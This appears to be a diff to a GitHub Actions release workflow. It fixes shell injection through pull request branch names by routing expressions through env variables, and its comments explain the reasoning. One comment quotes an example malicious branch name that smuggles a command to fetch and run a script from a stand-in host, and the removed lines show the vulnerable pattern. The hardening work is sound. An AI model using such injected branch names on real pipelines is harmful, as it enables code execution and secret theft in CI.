@@ -12,25 +12,48 @@ jobs:
       startsWith(github.event.pull_request.head.ref, 'release/')
     runs-on: ubuntu-latest
     steps:
+      # HEAD_REF is passed through `env:`, never interpolated into the script.
+      #
+      # A `${{ }}` expression is substituted into the script TEXT before bash
+      # parses it, so an attacker-chosen branch name becomes shell code rather
+      # than a shell string. Git permits `;`, `"`, `$`, `(`, `)` and backticks
+      # in ref names, so `release/1.0.0";curl evil.sh|sh;echo "` is a valid
+      # branch, and interpolating it here would run that command.
+      #
+      # The regex below cannot prevent that: it executes after the injected
+      # code has already run. Validation never protects an interpolation —
+      # only not interpolating does. Read through `$HEAD_REF` instead and the
+      # value is data the shell looks up at runtime, whatever it contains.
       - name: Derive version from branch name
         id: version
+        env:
+          HEAD_REF: ${{ github.event.pull_request.head.ref }}
         run: |
-          branch="${{ github.event.pull_request.head.ref }}"
-          version="${branch#release/}"
+          version="${HEAD_REF#release/}"
           if [[ ! "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-            echo "::error::Branch 'release/$version' is not a valid release/X.Y.Z branch"
+            echo "::error::Branch '$HEAD_REF' is not a valid release/X.Y.Z branch"
             exit 1
           fi
+          # Safe to write unquoted only because the anchored regex above has
+          # already restricted $version to digits and dots — a newline here
+          # would otherwise let it forge extra step outputs.
           echo "tag=v$version" >> "$GITHUB_OUTPUT"
 
       - name: Create release tag
         env:
           GH_TOKEN: ${{ secrets.RELEASE_TAG_TOKEN }}
+          # Same treatment for consistency. These three are GitHub-controlled
+          # (a repo slug, a validated tag, a 40-hex SHA) rather than
+          # attacker-controlled, but keeping every expression out of the
+          # script body means a reader never has to work out which is which.
+          REPO: ${{ github.repository }}
+          TAG: ${{ steps.version.outputs.tag }}
+          MERGE_SHA: ${{ github.event.pull_request.merge_commit_sha }}
         run: |
           if [ -z "$GH_TOKEN" ]; then
             echo "::error::RELEASE_TAG_TOKEN secret is not set on this repo/org — cannot create release tag."
             exit 1
           fi
-          gh api "repos/${{ github.repository }}/git/refs" \
-            -f ref="refs/tags/${{ steps.version.outputs.tag }}" \
-            -f sha="${{ github.event.pull_request.merge_commit_sha }}"
+          gh api "repos/${REPO}/git/refs" \
+            -f ref="refs/tags/${TAG}" \
+            -f sha="${MERGE_SHA}"
